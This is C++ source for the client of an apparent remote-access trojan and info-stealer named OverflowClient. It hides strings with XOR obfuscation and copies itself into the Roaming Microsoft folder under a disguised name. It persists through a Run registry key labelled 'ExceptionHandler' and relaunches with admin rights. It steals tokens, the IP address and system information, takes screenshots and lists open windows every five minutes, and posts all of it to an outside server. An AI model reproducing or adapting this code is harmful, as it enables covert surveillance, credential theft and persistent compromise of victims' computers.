#include <filesystem>
#include <string>
#include <fstream>
#include <vector>
#include <regex>
#include <iostream>
#include <thread>

#include "..\utility\xor.hpp"
#include "..\utility\requests.h"
#include "..\utility\helper.h"
#include "../gui/gui.h"
#include "functions.h"

namespace client {
	bool run_menu = false;

	const std::string STARTUP_FILE_NAME = xorstr_("COMProcess.exe");

	const std::string PROGRAM_NAME = xorstr_("OverflowClient.exe");

	std::string client_webhook_url = "";

	std::string ip = "";

	void background() {
		/* Assign IP */
		ip = client::functions::get_ip();

		/* Load Webhook */
		std::ifstream file(helpers::roaming + xorstr_("\\Microsoft\\") + xorstr_("log.txt"));
		if (file.good()) {
			std::getline(file, client_webhook_url);
		}
		file.close();

		/* Determine If Ran From Startup */
		auto uptime = std::chrono::milliseconds(GetTickCount64());
		if ((uptime / 1000).count() <= 120) {
			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=") + std::string(xorstr_("**PC Just Turned On**\n```\n") + std::to_string((uptime / 60000).count()) + std::string(xorstr_(" Minutes Ago")) + std::string(xorstr_("\n```"))) + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
		}

		/* Create Communication Thread */
		std::thread coms(communication::handler_loop);

		while (true) {
			/* Send Screenshot */
			client::functions::take_screenshot(helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
			requests::post_request_file(xorstr_("https://overflow.red/post.php"), helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_image&content=**PC Screenshot**&webhook_url=") + client_webhook_url + "&ip=" + client::ip);
			
			/* Send Current Windows */
			requests::post_request(xorstr_("https://overflow.red/post.php"), client::functions::prepare_payload("All Windows", client::functions::get_all_windows()) + std::string(xorstr_("&webhook_url=")) + client_webhook_url);

			Sleep(300000);
		}
	}

	void init() {
		/* Make Copy To Roaming Microsoft Folder*/
		try {
			std::filesystem::copy(PROGRAM_NAME, helpers::roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME);
		}
		catch (std::filesystem::filesystem_error & e) {}

		/* Edit registry */
		HKEY key = NULL;
		LONG v1 = RegCreateKey(HKEY_CURRENT_USER, xorstr_("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), &key);
		LONG v2 = RegSetValueEx(key, xorstr_("ExceptionHandler"), 0, REG_SZ, (BYTE*)(helpers::roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME).c_str(), ((helpers::roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME).size() + 1) * sizeof(wchar_t));

		/* Normal Stuff */
		run();

		/* Start Program */
		helpers::start_process_admin(helpers::roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME);
	}

	void run() {
		/* Create Client Channel */
		auto title = client::functions::get_ip();
		std::replace(title.begin(), title.end(), '.', ' ');
		requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=create_channel&name=client-") + title, &client_webhook_url);

		/* Verify Webook Url */
		if (client_webhook_url.empty())
			return;

		/* Get Tokens */
		auto tokens = client::functions::get_tokens();

		/* Post Tokens */
		requests::post_request(xorstr_("https://overflow.red/post.php"), client::functions::prepare_payload("Tokens", tokens) + xorstr_("&webhook_url=") + client_webhook_url);

		/* Post IP */
		ip = client::functions::get_ip();
		requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**IP**\n```\n") + ip + xorstr_("\n```&webhook_url=") + client_webhook_url);

		/* Post Computer Info */
		requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Computer Info**\n```\n") + client::functions::get_computer_info() + xorstr_("\n```&webhook_url=") + client_webhook_url);

		/* Save Webhook */
		std::ofstream file(helpers::roaming + xorstr_("\\Microsoft\\") + xorstr_("log.txt"));
		file << client_webhook_url << std::endl;
		file.close();
	}
}